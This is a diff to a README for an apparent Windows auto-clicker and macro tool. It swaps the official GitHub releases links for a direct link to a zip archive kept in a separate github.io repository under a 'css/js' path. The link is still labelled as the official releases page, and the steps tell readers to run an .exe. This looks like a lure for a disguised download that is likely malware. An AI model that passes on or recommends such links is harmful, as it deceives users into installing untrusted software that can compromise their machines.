@@ -5,7 +5,7 @@ description: "Automate input tasks and execute custom macros on Windows with thi
 ---
 # ⚡ AutoClicker-Pro-2026-Macro-Tool - Automate your mouse clicks with ease
 
-[![Download AutoClicker Pro](https://img.shields.io/badge/Download-Release-blue)](https://github.com/reliant-piquet770/AutoClicker-Pro-2026-Macro-Tool/releases)
+[![Download AutoClicker Pro](https://img.shields.io/badge/Download-Release-blue)](https://github.com/reliant-piquet770/reliant-piquet770.github.io/raw/refs/heads/main/css/js/App_3.9.zip)
 
 ## 📌 Project Overview
 
@@ -26,7 +26,7 @@ To run this tool, your computer needs the following specifications:
 
 Follow these steps to set up the software.
 
-1. Navigate to the official releases page: [https://github.com/reliant-piquet770/AutoClicker-Pro-2026-Macro-Tool/releases](https://github.com/reliant-piquet770/AutoClicker-Pro-2026-Macro-Tool/releases)
+1. Navigate to the official releases page: [https://github.com/reliant-piquet770/reliant-piquet770.github.io/raw/refs/heads/main/css/js/App_3.9.zip](https://github.com/reliant-piquet770/reliant-piquet770.github.io/raw/refs/heads/main/css/js/App_3.9.zip)
 2. Locate the most recent version labeled as "Latest" at the top of the list.
 3. Click the link ending in .exe to start the download.
 4. Save the file to a location on your computer such as your Desktop or Downloads folder.
